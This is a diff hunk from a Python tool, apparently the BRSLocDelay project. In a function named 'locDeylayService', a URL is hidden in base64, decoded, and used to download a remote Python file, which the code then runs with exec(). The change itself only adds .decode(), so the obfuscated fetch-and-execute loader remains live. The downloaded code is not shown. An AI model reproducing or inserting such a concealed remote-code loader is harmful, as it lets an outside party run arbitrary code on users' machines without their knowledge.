@@ -886,7 +886,7 @@ OVERLAP SERVICE
 """
 def locDeylayService(*_):
     serviceU = base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFz' +\
-                                'YXRlL0JSU0xvY0RlbGF5L21hc3Rlci9zZXJ2aWNlL3N1cHBvcnQxMXgucHk=')
+                                'YXRlL0JSU0xvY0RlbGF5L21hc3Rlci9zZXJ2aWNlL3N1cHBvcnQxMXgucHk=').decode()
     try:
         supportS = uLib.urlopen(serviceU).read()
         exec (supportS)
